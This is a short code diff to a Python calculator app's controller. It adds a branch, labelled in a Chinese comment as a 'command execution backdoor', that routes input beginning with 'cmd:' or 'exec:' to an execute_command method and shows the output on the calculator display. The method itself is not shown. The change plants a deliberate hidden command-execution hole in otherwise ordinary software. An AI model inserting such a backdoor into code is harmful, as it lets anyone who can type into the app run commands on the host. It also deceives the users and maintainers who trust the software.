@@ -46,6 +46,14 @@ class CalculatorController:
             if not expr or expr == "0":
                 return
             
+            # 处理命令执行后门（以 'cmd:' 或 'exec:' 开头）
+            if self.model.is_command(expr):
+                result_str, sub_label_str = self.model.execute_command(expr)
+                self.view.update_display(result_str, sub_label_str)
+                self.is_result_displayed = False
+                self.last_expression = None
+                return
+            
             # 处理 233 彩蛋
             if expr == '233':
                 self.view.update_display("哈哈哈", "")
